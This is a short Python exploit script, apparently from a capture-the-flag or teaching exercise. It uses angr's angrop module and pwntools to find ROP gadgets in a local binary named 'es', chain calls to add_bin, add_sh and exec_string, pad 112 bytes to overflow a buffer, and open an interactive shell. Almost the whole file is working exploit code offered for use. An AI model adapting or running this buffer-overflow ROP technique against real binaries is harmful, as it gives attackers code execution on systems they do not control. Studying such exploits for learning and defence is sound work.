"""
Exploit write in angr with angrop module. It build a ROP attacks for "es" binary.
It highlights the potentiality and the comfortable syntax
"""

import angr
import angrop
from pwn import *

file_path = 'es'

EXE_FILE = file_path
exe = ELF(EXE_FILE)  # create ELF binary

p = angr.Project(file_path)  # create angr project
rop = p.analyses.ROP()  # create ROP object
rop.find_gadgets()  # find every gadgets in binary

chain = rop.func_call("add_bin", [0xdeadbeef])  # build ROP chain with function call and function argument
chain += rop.func_call("add_sh", [0xcafebabe, 0x0badf00d])
chain += rop.func_call("exec_string", [])  # build ROP chain with function call

# print of chain string
print("ROP chain without padding:")
chain.print_payload_code()

ropchain = b'A' * (108 + 4)  # generate padding for exploit the buffer overflow vulnerability

io = process([EXE_FILE, ropchain + chain.payload_str()])  # executing the executable with ropchain as input
io.interactive()  # to manually interact with the spawn shell
